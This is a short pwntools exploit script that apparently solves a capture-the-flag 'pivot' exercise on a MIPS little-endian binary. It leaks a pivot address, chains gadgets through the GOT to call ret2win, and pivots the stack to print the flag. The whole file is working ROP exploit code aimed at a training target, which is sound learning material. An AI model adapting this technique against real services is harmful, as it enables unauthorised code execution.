from pwn import *
BINARY = "./pivot_mipsel"
ELF = ELF(BINARY)

context.os = "linux"
context.arch = "mips"
context.binary = BINARY

stack_pivot = 0x00400CD0
load_offset = 0x00400CA0
read_got = 0x00400CB0
add_jump = 0x00400CC4

foothold_plt = 0x400e60
foothold_got = 0x412060

ret2win_offset = 0x378

p = remote("10.0.0.2", 9999)
pivot_addr = p.recvuntil(b"\nSend a ROP chain now and it will land there").split(b"pivot: ")[-1].split(b"\nSend")[0]
# log.info(pivot_addr)
pivot_addr = int(pivot_addr, 16)

rop1 = b"A" * 8 
rop1 += p32(load_offset) # 下一个ra

rop1 += b"A" * 4
rop1 += p32(ret2win_offset)
rop1 += p32(foothold_plt)

rop1 += b"A" * 4
rop1 += p32(foothold_got)
rop1 += p32(load_offset)

rop1 += b"A" * 4
rop1 += p32(ret2win_offset)
rop1 += p32(add_jump)

p.recvuntil(b"> ")
p.sendline(rop1)

rop2 = b"A" * 0x20
rop2 += p32(pivot_addr)
rop2 += p32(stack_pivot)
p.recvuntil(b"> ")
p.sendline(rop2)

print(p.recvline_contains(b"ROPE"))